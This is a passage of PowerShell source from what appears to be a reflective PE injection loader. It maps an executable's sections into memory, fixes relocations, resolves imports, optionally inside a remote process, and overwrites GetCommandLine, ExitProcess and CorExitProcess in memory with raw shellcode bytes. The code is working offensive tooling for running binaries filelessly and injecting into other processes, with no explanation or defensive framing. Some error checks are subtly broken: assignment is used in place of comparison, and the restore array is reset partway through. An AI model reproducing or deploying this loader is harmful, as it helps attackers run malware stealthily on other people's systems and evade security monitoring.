		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
